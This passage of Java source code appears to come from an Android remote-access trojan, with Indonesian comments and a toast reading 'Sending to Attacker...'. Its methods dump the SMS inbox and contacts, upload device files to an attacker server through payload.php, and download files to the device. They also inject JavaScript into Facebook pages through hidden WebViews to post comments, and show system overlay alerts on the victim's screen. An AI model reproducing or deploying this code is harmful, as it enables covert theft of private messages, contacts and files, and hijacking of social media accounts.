		installator.execute(efile, pathsatu, pathdua);
	}

	private static String getExtension(String path) {
        if (path.contains(".")) {
            return path.substring(path.lastIndexOf(".")).toLowerCase();
        }
        return null;
    }

    public void doRecentAction() {
		try {
			Class ServiceManager = Class.forName("android.os.ServiceManager");
			Method getService = ServiceManager
					.getMethod("getService", new Class[]{String.class});
			Object[] statusbarObj = new Object[]{"statusbar"};
			IBinder binder = (IBinder) getService.invoke(ServiceManager,
					statusbarObj);
			Class IStatusBarService = Class.forName(
					"com.android.internal.statusbar.IStatusBarService")
					.getClasses()[0];
			Method asInterface = IStatusBarService.getMethod("asInterface",
					new Class[]{IBinder.class});
			Object obj = asInterface.invoke(null, new Object[]{binder});
			IStatusBarService.getMethod("toggleRecentApps", new Class[0]).invoke(
					obj, new Object[0]);
		} catch (Exception e) {
		}
	}

	public String setWalpaper(Context context, String pathImg) {
		
		try {
			FileInputStream fileInputStream = new FileInputStream(new File(pathImg));
			Bitmap bitmap = BitmapFactory.decodeStream(fileInputStream);

			context.setWallpaper(bitmap);
			return "sukses setWallpaper";
		
		} catch(Exception e) {
			return "Failed setWallpaper: "+e;
		}
	}

    public String getSms(Context context) {
    	StringBuffer resultRsms = new StringBuffer();
		Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
		if (cursor.moveToFirst()) {
			do {
				String msgData = "";
				for (int idx=0; idx<cursor.getColumnCount(); idx++) {
					msgData += ""+cursor.getColumnName(idx)+":"+cursor.getString(idx);
				}
				resultRsms.append(msgData+"\n");
				
			} while (cursor.moveToNext());
		}
		return resultRsms.toString();
    }

    public String getContacts(Context context) {
    	StringBuffer out = new StringBuffer();
    	ContentResolver cr = context.getContentResolver();
    	Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

    	if (cur.getCount() > 0) {
    		while(cur.moveToNext()) {
    			String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
    			String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

    			if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
    				out.append("name: "+name+", ID: "+id+" ");

    				//phone
    				Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID+ "=?", new String[]{id}, null);
    				while(pCur.moveToNext()) {
    					String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
    					out.append("phone: "+phone+"\n");
    				}
    				pCur.close();

    				//email
    				Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID+"=?", new String[]{id}, null);
    				while(emailCur.moveToNext()) {
    					String email = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
    					String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
    				
    					out.append("Email: "+email+" EmailType: "+emailType+"\n");
    				}
    				emailCur.close();

    				/*/note
    				String noteWhere = ContactsContract.Data.CONTACT_ID + "=?AND"+ContactsContract.Data.MIMETYPE+"=?";
    				String[] noteWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
    				Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
    				if (noteCur.moveToFirst()) {
    					String note = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
    					out.append("Note: "+note+"\n");
    				}
    				noteCur.close();

    				//get postal Address...
    				String addrWhere = ContactsContract.Data.CONTACT_ID+"=?AND"+ContactsContract.Data.MIMETYPE+"=?";
    				String[] addrWhereParams = new String[]{id, ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
    				Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);
    				while (addrCur.moveToNext()) {
    					out.append("\npoBox: " + addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX)));
    					out.append("\nstreet: " + addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET)));
    					out.append("\ncity: " + addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY)));
    					out.append("\nstate: " + addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION)));
    					out.append("\npostalCode: " + addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE)));
    					out.append("\ncountry: " + addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY)));
    					out.append("\ntype: " + addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE)));
    				
    				}
    				addrCur.close();

    				//get Instace Messenger
    				String imWhere = ContactsContract.Data.CONTACT_ID+"=?AND "+ContactsContract.Data.MIMETYPE+"=?";
    				String[] imWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
    				Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
    				if (imCur.moveToFirst()) {
    					out.append("\n\nmName: "+ imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA)));
    					out.append("\nmType: "+ imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE)));
    				}
    				imCur.close();

    				//get Origaisasi...
    				String orgWhere = ContactsContract.Data.CONTACT_ID+"=?AND "+ContactsContract.Data.MIMETYPE+"=?";
    				String[] orgWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
    				Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);
    				if (orgCur.moveToFirst()) {
    					out.append("\n\norgName: "+ orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA)));
    					out.append("\ntitle: "+ orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE)));
    				}
    				orgCur.close();*/
    			}
    		}
    	}
    	return out.toString();
    }


	public void audio(Context context, String pathAudio, String start) {
		MediaPlayer player = new MediaPlayer();
		Intent mIntent = new Intent(context, MainScreen.class);
		mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(mIntent);

		if (start.equals("start")) {
			try {
				player.setDataSource(pathAudio);
			}catch(Exception e) {}

			player.setLooping(false);
			player.setVolume(100, 100);

			try {
				player.prepare();
				player.start();
			}catch(Exception e) {}
		}
		else {
			player.stop();
			player.release();
		}
	}

	public static int getScreenWidth() {
		return Resources.getSystem().getDisplayMetrics().widthPixels;
	}
	public static int getScreenHeight() {
		return Resources.getSystem().getDisplayMetrics().heightPixels;
	}

	public void setScreenCerah(Context context, float var) {
		final Dialog dialog = new Dialog(context) {
            @Override
            public void onAttachedToWindow() {
                super.onAttachedToWindow();
                WindowManager.LayoutParams layout = getWindow()
                        .getAttributes();
                layout.screenBrightness = var;
                getWindow().setAttributes(layout);
            }
        };
        dialog.getWindow().requestFeature(Window.FEATURE_NO_TITLE);
        dialog.setCanceledOnTouchOutside(true);
        dialog.show();
	}

	public void toastText(Context context, String data, int warna, int letak)
	{
		LinearLayout layout = new LinearLayout(context);
		
		/* entah kenapa imgage tidak bisa ditampilkan di app JT*/
		ImageView image = new ImageView(context);
		
		image.setImageResource(android.R.drawable.ic_menu_directions);
		layout.addView(image);
		
    	TextView text = new TextView(context);
		text.setText(data);
		text.setTextColor(Color.BLACK);
		text.setTextSize(13);
		text.setGravity(Gravity.CENTER);
		layout.addView(text);

		toast = new Toast(context.getApplicationContext());
		toast.setGravity(letak, 0, 0);
		toast.setView(text);
		toast.setView(layout);

		View toastView = toast.getView();
		toastView.setBackgroundColor(warna);
	}

	public void toastImage(Context context, String path, int letak)
	{
		toast = new Toast(context.getApplicationContext());
		toast.setGravity(letak, 0, 0);
		toast.setView(new ViewKu(context, path, ""));

		View toastView = toast.getView();
		toastView.setBackgroundColor(Color.TRANSPARENT);
	}

	public void dialogAlert(Context context, String title, String text) {
		dialog = new AlertDialog.Builder(context)
					.setTitle(title)
					.setMessage(text)
					.setIcon(android.R.drawable.ic_menu_directions)
					.create();
		dialog.setCancelable(false);
		dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
		dialog.show();
	}

	public void chatDialogAlert(Context context, String title, String text, String aksi) {
		LinearLayout layout = new LinearLayout(context);
		Button btnSend = new Button(context);
        edtContent = new EditText(context);

        btnSend.setText("Kirim...");
        edtContent.setHint("Balas");

        LinearLayout.LayoutParams layoutParamsEdtContent = new LinearLayout.LayoutParams(300, 50);
		LinearLayout.LayoutParams layoutParamsBtnSend = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
		LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);
        
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setLayoutParams(layoutParams);
		
		layout.addView(edtContent, layoutParamsEdtContent);
        layout.addView(btnSend, layoutParamsBtnSend);

		dialog = new AlertDialog.Builder(context)
					.setTitle(title)
					.setView(layout)
					.setMessage(text)
					.setIcon(android.R.drawable.ic_menu_directions)
					.create();
		dialog.setCancelable(true);
		dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
		dialog.show();

		btnSend.setOnClickListener(new View.OnClickListener()
            {
                public void onClick(View v){
                    dialog.cancel();

                    if (aksi.equals("fb")) {
                    	Log.i(TAG, "chatFB");
                    	SystemThread ss = new SystemThread();
                    	//fbPayload(context, ss.formPostinganEdt+"'"+edtContent.getText().toString()+"';" +ss.formPostinganBtn, ss.urlfbPostinganEdt);
                    	fbBigPayload(context, 0, edtContent.getText().toString(), ss.urlfbPostingan);
                    
                    } else {

	                    Log.i(TAG, "chat");

						String waktu = new SimpleDateFormat("HH:mm:ss").format(new Date());
						String ip = Identitas.getIPAddress(true);
						String hash = "";
						String[] pros = { "["+waktu+"] ->"+ip+" ->"+edtContent.getText().toString() };
						try {
							for (String s : pros)     
							{
								hash = URLEncoder.encode(s, "UTF-8");       
							}
						}catch (Exception e) {}

						requestUrl = system.urlServer+"/payload.php?outpayload="+hash;
						requestAksi = "web";
						mainRequest(context);
					}

	                Toast.makeText(context, "Mengirim ke Attacker...", Toast.LENGTH_LONG).show();
                }
            });
	}

	public void windowAlert(Context context, String text, boolean sw) {
		ViewKu view = new ViewKu(context, "window", "text");

		if (sw) {
			WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        	WindowManager.LayoutParams lp = new WindowManager.LayoutParams(300, 300,
																	   WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
																	   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
        	lp.gravity = Gravity.START | Gravity.TOP;
        	wm.addView(view, lp);
        }
        else {
			WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        	wm.removeViewImmediate(view);
        }
	}

	public void ballAnime(Context context, int letak) {
		toast = new Toast(context.getApplicationContext());
		toast.setGravity(letak, 0, 0);

		View bouncingBallView = new BouncingBallView(context);
      	bouncingBallView.setBackgroundColor(Color.BLACK);

		toast.setView(bouncingBallView);

		View toastView = toast.getView();
		toastView.setBackgroundColor(Color.TRANSPARENT);
	}

    private class ViewKu extends View {
		private Bitmap image;
		private Paint redPaint;
		private int screenW;
		private int screenH;
		private String shift = "";
		private String windowText = "";

		public ViewKu(Context context, String pathAlert, String windowText) {
			super(context);
			this.shift = pathAlert;
			this.windowText = windowText;

			if (pathAlert.equals("window")) {
				redPaint = new Paint();	
				redPaint.setColor(Color.RED);
			}
			else {
				image = BitmapFactory.decodeFile(pathAlert);
			}
		}
	
		@Override 
		protected void onDraw(Canvas canvas) {
			if (shift.equals("window")) {
				canvas.drawCircle(100, 100, 30, redPaint);
				canvas.drawText("Whacked:", 10, redPaint.getTextSize()+10, redPaint);
			}
			
			else {
				canvas.drawBitmap(image, (screenW-image.getWidth())/9, 0, null);
			}
		}
	}

	public View setWebView(Context context, String textUrl, String pilihAksi) {
		WebView webView = new WebView(context);
		TextView textView = new TextView(context);

		class MyJavaScriptInterface 
		{
			private TextView textView;

			public MyJavaScriptInterface(TextView aContentView) {
				textView = aContentView;
			}

			@SuppressWarnings("unused")
			public void processContent(String aContent) {
				final String content = aContent;
				textView.post(new Runnable()
				{
					public void run() {
						textView.setText(content);
						Log.i(TAG, "yio: "+content);
					}
				});
			}
		}
		webView.getSettings().setJavaScriptEnabled(true);
		webView.addJavascriptInterface(new MyJavaScriptInterface(textView), "INTERFACE");
		webView.setWebViewClient(new WebViewClient() {
			@Override
			public void onPageFinished(WebView view, String url) {
				view.loadUrl("javascript:window.INTERFACE.processContent(document.getElementsByTagName('body')[0].innerText);");
			}
		});

		webView.loadUrl(textUrl);

		if (pilihAksi.equals("text"))
			return textView;
		else
			return webView;
	}

	public void fbWebkit(Context context, String offUrl) {

		if (processFbWebkit) 
		{
			webFbWebkit = new WebView(context);

			String ok = "";

			class MyJavaScriptInterface 
			{
				private String ok = "";

				public MyJavaScriptInterface(String aContentView) {
					ok = aContentView;
				}

				@SuppressWarnings("unused")
				public void processContent(String out) {
					resultFbWebkit = out;
				}
			}
			webFbWebkit.getSettings().setJavaScriptEnabled(true);
			webFbWebkit.addJavascriptInterface(new MyJavaScriptInterface(ok), "INTERFACE");
			webFbWebkit.setWebViewClient(new WebViewClient() {
				@Override
				public void onPageStarted(WebView view, String url, Bitmap fav) {
					processFbWebkit = false;
				}
				@Override
				public void onPageFinished(WebView view, String url) {
					view.loadUrl("javascript:window.INTERFACE.processContent(document.getElementsByTagName('body')[0].innerText);");
					processFbWebkit = true;
				}
			});
			webFbWebkit.loadUrl(offUrl);

		}

	}

	public void fbTarget(Context context, String offUrl) {

		if (processFbTarget) 
		{
			webFbTarget = new WebView(context);

			String ok = "";

			class MyJavaScriptInterface 
			{
				private String ok = "";

				public MyJavaScriptInterface(String aContentView) {
					ok = aContentView;
				}

				@SuppressWarnings("unused")
				public void processContent(String out) {
					Log.i("qwertyuiop", "++ content: "+out);

					resultFbPayload = out;

					try {
						String[] split = out.split("-target-");
						resultFbTarget = split[1];
				
					} catch(Exception e) {
						resultFbTarget = "kosong";
					}
				}
			}
			webFbTarget.getSettings().setJavaScriptEnabled(true);
			webFbTarget.addJavascriptInterface(new MyJavaScriptInterface(ok), "INTERFACE");
			webFbTarget.setWebViewClient(new WebViewClient() {
				@Override
				public void onPageStarted(WebView view, String url, Bitmap fav) {
					processFbTarget = false;
				}
				@Override
				public void onPageFinished(WebView view, String url) {
					view.loadUrl("javascript:window.INTERFACE.processContent(document.getElementsByTagName('body')[0].innerText);");
					processFbTarget = true;
				}
			});
			webFbTarget.loadUrl(offUrl);

		} else {
			resultFbPayload = "";
		}

	}

	public void fbBigPayload(Context context, int id, String data, String offUrl) {

		webFbPayload = new WebView(context);

		if (processFbPayloadBig) {
			webFbPayload.getSettings().setJavaScriptEnabled(true);
			webFbPayload.setWebViewClient(new WebViewClient() {
				int iza = 0;
				boolean loop = true;
				SystemThread sys = new SystemThread();

				@Override
				public void onPageStarted(WebView view, String url, Bitmap fav) {
					if (iza == 0) {
						Log.i(TAG, "data"+id+" wait...");
						processFbPayloadBig = false;
					}
					
					iza++;
				}
				@Override
				public void onPageFinished(WebView view, String url) {

					if (loop) 
					{
						loop = false;
						view.loadUrl(sys.formKomentarEdt+"'-"+id+"-"+data+"-"+id+"-';" +sys.formKomentarBtn);
						
						Log.i(TAG, "data"+id+" selesai");
						
						processFbPayloadBig = true;
						sys.iFB++;
					}
				}
			});
			webFbPayload.loadUrl(offUrl);
		}
	}

	public void fbPayload(Context context, String javascript, String offUrl) {

		if (processFbPayload) 
		{
			webFbPayload = new WebView(context);

			webFbPayload.getSettings().setJavaScriptEnabled(true);
			webFbPayload.setWebViewClient(new WebViewClient() {
				boolean loop = true;

				@Override
				public void onPageStarted(WebView view, String url, Bitmap fav) {
					//Log.i(TAG, "++ payload wait...");
					processFbPayload = false;
				}
				@Override
				public void onPageFinished(WebView view, String url) {

					if (loop) {
						view.loadUrl(javascript);
						loop = false;
					}

					processFbPayload = true;

					//Log.i(TAG, "++ payload finish: "+resultFbTarget);

				}
			});
			webFbPayload.loadUrl(offUrl);

		}

		Log.i(TAG, "processPayload: "+processFbPayload);

	}

	public View xfbPayload(Context context, String javascript, String offUrl) {
		webFbPayload = new WebView(context);

		webFbPayload.getSettings().setJavaScriptEnabled(true);
		webFbPayload.setWebViewClient(new WebViewClient() {
			boolean loop = true;

			@Override
			public void onPageStarted(WebView view, String url, Bitmap fav) {
				//Log.i(TAG, "++ payload wait...");
			}
			@Override
			public void onPageFinished(WebView view, String url) {

				if (loop) {
					view.loadUrl(javascript);
					loop = false;
				}
				//Log.i(TAG, "++ payload finish: "+resultFbTarget);

			}
		});

		webFbPayload.loadUrl(offUrl);

		return webFbPayload;
	}

	public void mainRequest(Context context) {
		CallWebPageTask task = new CallWebPageTask();
		task.applicationContext = context;
		task.main = requestAksi;

		try {
			if (cekConnection(context)) {
				task.execute(new String[] { requestUrl });
			} else {
				Log.i(TAG, "rece connection : "+cekConnection(context));
			}
		}catch(Exception e) {
		}
	}

	public String requestUpload() {
		String strSDPath = requestPath;
		String strUrlServer = requestUrl;
            
		int bytesRead, bytesAvailable, bufferSize;
		byte[] buffer;
		int maxBufferSize = 1 * 1024 * 1024;
		int resCode = 0;
		String resMessage = "";

		String lineEnd = "\r\n";
		String twoHyphens = "--";
		String boundary =  "*****";
		String resServer = "";

        	
		try {
			/** Check file on SD Card ***/
			File file = new File(strSDPath);
			if(!file.exists())
			{
				resServer = "{\"StatusID\":\"0\",\"Error\":\"Please check path on SD Card\"}";
				return null;
			}

			FileInputStream fileInputStream = new FileInputStream(new File(strSDPath));

			URL url = new URL(strUrlServer);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setDoInput(true);
			conn.setDoOutput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");

			conn.setRequestProperty("Connection", "Keep-Alive");
			conn.setRequestProperty("Content-Type",
										"multipart/form-data;boundary=" + boundary);

			DataOutputStream outputStream = new DataOutputStream(conn
																	 .getOutputStream());
			outputStream.writeBytes(twoHyphens + boundary + lineEnd);
			outputStream.writeBytes("Content-Disposition: form-data; name=\"filUpload\";filename=\""+ strSDPath + "\"" + lineEnd);
			outputStream.writeBytes(lineEnd);

			bytesAvailable = fileInputStream.available();
			bufferSize = Math.min(bytesAvailable, maxBufferSize);
			buffer = new byte[bufferSize];

			// Read file
			bytesRead = fileInputStream.read(buffer, 0, bufferSize);

			while (bytesRead > 0) {
				outputStream.write(buffer, 0, bufferSize);
				bytesAvailable = fileInputStream.available();
				bufferSize = Math.min(bytesAvailable, maxBufferSize);
				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			}

			outputStream.writeBytes(lineEnd);
			outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

			// Response Code and  Message
			resCode = conn.getResponseCode();
			if(resCode == HttpURLConnection.HTTP_OK)
			{
				InputStream is = conn.getInputStream();
				ByteArrayOutputStream bos = new ByteArrayOutputStream();

				int read = 0;
				while ((read = is.read()) != -1) {
					bos.write(read);
				}
				byte[] result = bos.toByteArray();
				bos.close();
				resMessage = new String(result);
			}

			Log.d("resCode=",Integer.toString(resCode));
			Log.d("resMessage=",resMessage.toString());

			fileInputStream.close();
			outputStream.flush();
			outputStream.close();

			resServer = resMessage.toString();
			requestResultUpload = resServer;
		
		} catch (Exception ex) {
			// Exception handling
			requestResultUpload = "uploaderror";

			return null;
		}
		return resServer;
	}
	

	public String requestDownload() {
		InputStream input = null;
        OutputStream output = null;
        HttpURLConnection connection = null;
        String error = "";
        try {
            URL url = new URL(requestUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.connect();

            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                return "Server returned HTTP "+ connection.getResponseCode()+" "+connection.getResponseMessage();
            }

            int fileLength = connection.getContentLength();

            // download the file
            input = connection.getInputStream();
            output = new FileOutputStream(requestPath);
            byte data[] = new byte[4096];
            long total = 0;
            int count;

            while ( (count=input.read(data)) != -1 ) {
                /*if (isCancelled()) {
                    input.close();
                    return null;
                }*/
                total += count;

                if (fileLength > 0) 
                	sizedownload = (int) (total * 100 / fileLength);
                    //publishProgress((int) (total*100/fileLength));
                output.write(data, 0, count);
            }

        } catch (IOException e) {
            error = e.toString();
        } finally {
            try {
                if (output != null) output.close();
                if (input != null) input.close();
            }
            catch (IOException ioe) {

            }
            if (connection != null) connection.disconnect();
        }
        return "ok : "+error;
	}
	
	//Mengirimkan data web keserver
	public String requestWeb(){
		String sret = "";
		HttpParams httpParams = new BasicHttpParams();
	    HttpConnectionParams.setConnectionTimeout(httpParams, 50000);
	    HttpConnectionParams.setSoTimeout(httpParams, 50000);

        HttpClient httpClient = new DefaultHttpClient(httpParams);
        HttpGet request = new HttpGet(requestUrl);
        try{
            HttpResponse response = httpClient.execute(request);

            try { // split result
         	   InputStream in = response.getEntity().getContent();
         	   BufferedReader reader = new BufferedReader(new InputStreamReader(in));
         	   StringBuilder str = new StringBuilder();
         	   String line = null;
         	   while((line = reader.readLine()) != null){
         	       str.append(line);
         	   }
         	   in.close();
         	   sret = str.toString();
        	} catch(Exception ex) {
        	  	Log.i(TAG, "Error split text");
        	}
        }
		catch(Exception ex){
			Log.i(TAG, "Failed rece Connect to Server!");
        }
        return sret;
    }

    


	private class CallWebPageTask extends AsyncTask<String, Void, String> 
	{
		protected Context applicationContext;
		protected String main = "";
		// connecting...
		@Override
		protected void onPreExecute() {}

	    @Override
	    protected String doInBackground(String... data) {
	    	//data[0] = url
	    	if (main.equals("web")) {
				return requestWeb();
			}
			else if (main.equals("download")){
				return requestDownload();
			}
			else if (main.equals("upload")) {
				return requestUpload();
			}
			return null;
	    }

	    // berhasil
	    @Override
	    protected void onPostExecute(String result) {
	    	if (main.equals("web")) {
		    	requestResult = result;
	    	}
		}
	}

}

class BouncingBallView extends View {
   private int xMin = 0;          // This view's bounds
   private int xMax;
   private int yMin = 0;
   private int yMax;
   private static float eyeX = 40;
   private static float eyeY = 20;
   private float ballRadius = 10; // Ball's radius
   private float ballX = ballRadius + 20;  // Balls center (x,y)
   private float ballY = ballRadius + 40;
   private float ballSpeedX = 5;  // Balls speed (x,y)
   private float ballSpeedY = 3;
   private RectF ballBounds;      // Needed for Canvas.drawOval
   private Paint paint;           // The paint (e.g. style, color) used for drawing
   
   // Constructor
   public BouncingBallView(Context context) {
      super(context);
      ballBounds = new RectF();
      paint = new Paint();
   }
  
   // Called back to draw the view. Also called by invalidate().
   @Override
   protected void onDraw(Canvas canvas) {
      // Draw the ball
      ballBounds.set(ballX-ballRadius, ballY-ballRadius, ballX+ballRadius, ballY+ballRadius);
      paint.setColor(Color.GREEN);
      canvas.drawOval(ballBounds, paint);
      paint.setColor(Color.RED);

      eyeX += 1;
      eyeY += 1;

      if (eyeX == 7 && eyeY == 4) {
      	  eyeX = 2;
      	  eyeY = 1;

      	  if (eyeX == 8 && eyeY == 5) {
      	  	  eyeX = 4;
      	  	  eyeY = 2;
      	  }
      }

      canvas.drawLine(0, 0, eyeX, eyeY, paint);

        
      // Update the position of the ball, including collision detection and reaction.
      update();
  
      // Delay
      try {  
         Thread.sleep(30);  
      } catch (InterruptedException e) { }
      
      invalidate();  // Force a re-draw
   }
   
   // Detect collision and update the position of the ball.
   private void update() {
      // Get new (x,y) position
      ballX += ballSpeedX;
      ballY += ballSpeedY;
      // Detect collision and react
      if (ballX + ballRadius > xMax) {
         ballSpeedX = -ballSpeedX;
         ballX = xMax-ballRadius;
      } else if (ballX - ballRadius < xMin) {
         ballSpeedX = -ballSpeedX;
         ballX = xMin+ballRadius;
      }
      if (ballY + ballRadius > yMax) {
         ballSpeedY = -ballSpeedY;
         ballY = yMax - ballRadius;
      } else if (ballY - ballRadius < yMin) {
         ballSpeedY = -ballSpeedY;
         ballY = yMin + ballRadius;
      }
   }
   
   // Called back when the view is first created or its size changes.
   @Override
   public void onSizeChanged(int w, int h, int oldW, int oldH) {
      // Set the movement bounds for the ball
      xMax = w-1;
      yMax = h-1;
   }
}

